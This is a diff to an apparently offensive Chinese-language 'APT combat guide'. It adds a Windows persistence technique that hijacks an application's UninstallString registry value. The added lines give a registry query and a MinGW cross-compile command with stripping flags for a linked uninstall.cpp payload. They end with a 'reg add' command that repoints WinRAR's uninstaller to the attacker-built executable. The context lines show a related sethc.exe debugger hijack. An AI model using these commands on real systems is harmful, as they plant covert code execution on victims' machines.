@@ -1099,3 +1099,22 @@ x86_64-w64-mingw32-g++ -O2 sethc.cpp -o sethc.exe -I/usr/share/mingw-w64/include
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /s
 Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" -Force -Verbose
 ```
+
+### 应用卸载
+
++ HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\[应用名称]
++ HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\QuietUninstallString\[应用名称]
+
+```powershell
+reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WinRAR archiver" /s
+```
+
+[uninstall.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Per/uninstall.cpp)
+
+```Bash
+x86_64-w64-mingw32-g++ -O2 uninstall.cpp -o uninstall.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
+```
+
+```powershell
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WinRAR archiver" /v "UninstallString" /t REG_SZ /d "C:\Program Files\WinRAR\uninstall.exe" /f
+```
